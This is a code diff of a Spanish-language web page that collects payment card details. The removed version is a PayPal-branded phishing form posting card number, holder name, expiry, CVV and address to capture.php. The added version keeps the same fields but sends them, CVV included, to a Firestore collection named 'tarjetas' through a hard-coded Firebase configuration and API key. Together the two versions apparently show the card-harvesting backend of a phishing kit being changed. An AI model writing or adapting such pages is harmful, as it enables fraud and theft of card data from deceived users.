@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Pago Seguro - PayPal</title>
-  <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png" type="image/png">
-  <style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Asociar Tarjeta con Firebase</title>
+</head>
+<style>
     body {
       font-family: Arial, sans-serif;
       background-color: #f5f7fa;
@@ -82,72 +83,79 @@
       height: auto;
     }
   </style>
-</head>
 <body>
-  <div class="container">
-    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="paypal-logo" alt="PayPal">
-    <h2>Asocie una tarjeta para comprar</h2>
-    <form method="POST" action="capture.php">
-      <label for="numero">N.º tarjeta débito o crédito</label>
-      <input type="text" id="numero" name="numero" maxlength="19" required placeholder="1234 5678 9012 3456">
 
-      <label for="titular">Nombre del titular</label>
-      <input type="text" id="titular" name="titular" placeholder="Ej. Juan Pérez" required>
+  <h1>Asociar Tarjeta</h1>
+  <form id="tarjetaForm">
+    <label>
+      Número:
+      <input type="text" name="numero" required maxlength="25" />
+    </label><br />
+    <label>
+      Titular:
+      <input type="text" name="titular" required maxlength="100" />
+    </label><br />
+    <label>
+      Tipo:
+      <input type="text" name="tipo" required maxlength="20" />
+    </label><br />
+    <label>
+      Expiración:
+      <input type="text" name="exp" required maxlength="10" placeholder="MM/AA" />
+    </label><br />
+    <label>
+      CVV:
+      <input type="text" name="cvv" required maxlength="5" />
+    </label><br />
+    <label>
+      Dirección:
+      <textarea name="direccion" rows="3"></textarea>
+    </label><br />
+    <button type="submit">Asociar tarjeta</button>
+  </form>
 
-      <label for="tipo">Tipo de tarjeta</label>
-      <select id="tipo" name="tipo" required>
-        <option value="">Seleccione su tipo de tarjeta</option>
-        <option value="visa">Visa</option>
-        <option value="mastercard">MasterCard</option>
-        <option value="amex">American Express</option>
-        <option value="disc">Discover</option>
-        <option value="diners">Diners Club</option>
-      </select>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
 
-      <label for="exp">Fecha de vencimiento</label>
-      <input type="text" id="exp" name="exp" placeholder="MM/AA" maxlength="5" required>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBp_5laH8i7gBQ4SLl5RcSobs0xM9Kg3oE",
+      authDomain: "pagos-bc42c.firebaseapp.com",
+      projectId: "pagos-bc42c",
+      storageBucket: "pagos-bc42c.firebasestorage.app",
+      messagingSenderId: "793081747436",
+      appId: "1:793081747436:web:3020a54bdce85a61a9d2c9",
+      measurementId: "G-FYBLX78MEH"
+    };
 
-      <label for="cvv">Código de seguridad</label>
-      <div class="cvv-container">
-        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
-        <img src="https://static.vecteezy.com/system/resources/previews/029/921/552/non_2x/credit-card-secure-cvv-code-financial-label-stock-illustration-vector.jpg" alt="CVV Info">
-      </div>
+    // Inicializar Firebase y Firestore
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-      <label for="direccion">Dirección de la tarjeta</label>
-      <input type="text" id="direccion" name="direccion" placeholder="Ej. Calle 1 Av 2" required>
+    const form = document.getElementById("tarjetaForm");
 
-      <button type="submit">Asociar tarjeta</button>
-    </form>
-  </div>
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-  <script>
-    // Formato y validación número de tarjeta
-    document.getElementById('numero').addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '');
-      value = value.substring(0, 16);
-      e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
-    });
+      const data = {
+        numero: form.numero.value.trim(),
+        titular: form.titular.value.trim(),
+        tipo: form.tipo.value.trim(),
+        exp: form.exp.value.trim(),
+        cvv: form.cvv.value.trim(),
+        direccion: form.direccion.value.trim(),
+        fecha: serverTimestamp()
+      };
 
-    // Solo letras en nombre del titular
-    document.getElementById('titular').addEventListener('input', function (e) {
-      e.target.value = e.target.value.replace(/[^a-zA-ZÁÉÍÓÚÑáéíóúñ\s]/g, '');
-    });
-
-    // Fecha MM/AA automática con "/"
-    const expInput = document.getElementById('exp');
-    expInput.addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 4) value = value.substring(0, 4);
-      if (value.length >= 3) {
-        value = value.substring(0,2) + '/' + value.substring(2);
+      try {
+        await addDoc(collection(db, "tarjetas"), data);
+        alert("Tarjeta asociada con éxito");
+        form.reset();
+      } catch (error) {
+        alert("Error al guardar: " + error.message);
       }
-      e.target.value = value;
-    });
-
-    // Solo números y 3 dígitos para CVV
-    document.getElementById('cvv').addEventListener('input', function (e) {
-      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
     });
   </script>
+
 </body>
 </html>
